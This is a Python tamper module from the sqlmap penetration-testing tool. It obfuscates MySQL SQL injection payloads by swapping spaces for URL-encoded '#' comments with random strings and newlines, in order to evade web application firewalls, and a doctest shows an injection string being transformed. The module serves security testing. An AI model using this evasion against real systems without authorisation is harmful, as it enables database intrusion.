#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import re
import random
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s > 5.1.13" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a pound character ('#') followed by
    a random string and a new line ('\n')

    Requirement:
        * MySQL >= 5.1.13

    Tested against:
        * MySQL 5.1.41

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227'
    """

    def process(match):
        word = match.group('word')
        randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))

        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
        else:
            return match.group()

    retVal = ""

    if payload:
        payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), payload)

        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
